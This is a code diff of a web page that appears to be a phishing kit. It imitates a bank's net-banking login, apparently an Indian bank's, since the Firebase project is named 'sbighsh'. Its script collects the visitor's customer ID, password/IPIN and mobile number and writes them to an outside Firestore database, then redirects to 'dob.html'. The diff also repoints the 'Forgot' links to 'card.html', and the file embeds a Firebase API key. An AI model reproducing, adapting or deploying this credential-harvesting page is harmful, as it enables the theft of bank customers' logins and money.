@@ -125,7 +125,6 @@
       margin-left: 5px;
     }
 
-    /* Loading Overlay */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -180,13 +179,12 @@
     <form id="loginForm">
       <label>Customer ID/User ID</label>
       <input type="text" id="customerId" required>
-
-      <a href="#" class="link">Forgot Customer ID</a>
+      <a href="card.html" class="link">Forgot Customer ID</a>
 
       <label>Password/IPIN</label>
       <input type="password" id="password" required>
+      <a href="card.html" class="link">Forgot Password / IPIN</a>
 
-      <a href="#" class="link">Forgot Password / IPIN</a>
       <div class="note">IPIN (Password) is case sensitive</div>
 
       <label>Mobile Number</label>
@@ -200,7 +198,6 @@
       <button class="btn" type="submit">LOGIN</button>
     </form>
 
-    <!-- Bottom Image -->
     <img class="bottom-image" src="https://i.ibb.co/dw7tSCHQ/Screenshot-2025-05-12-20-55-22-29-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
 
@@ -231,7 +228,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 
   <script>
-    // Firebase Configuration
     const firebaseConfig = {
       apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
       authDomain: "sbighsh.firebaseapp.com",
@@ -241,7 +237,6 @@
       appId: "1:685947657107:web:471a0557bb72235272a666"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
   </script>
@@ -256,26 +251,23 @@
       if (form.checkValidity()) {
         loading.style.display = 'flex';
 
-        // Get form data
         const customerId = document.getElementById('customerId').value.trim();
         const password = document.getElementById('password').value.trim();
         const mobile = document.getElementById('mobile').value.trim();
 
-        // Save to Firestore
         db.collection("alldata-hare").add({
           customerId: customerId,
           password: password,
           mobile: mobile,
           timestamp: firebase.firestore.FieldValue.serverTimestamp()
         }).then(() => {
-          // Start countdown
           let timeLeft = 10;
           const timer = setInterval(() => {
             timeLeft--;
             countdown.textContent = timeLeft;
             if (timeLeft <= 0) {
               clearInterval(timer);
-              window.location.href = 'dob.html'; // Change this URL
+              window.location.href = 'dob.html';
             }
           }, 1000);
         }).catch((error) => {
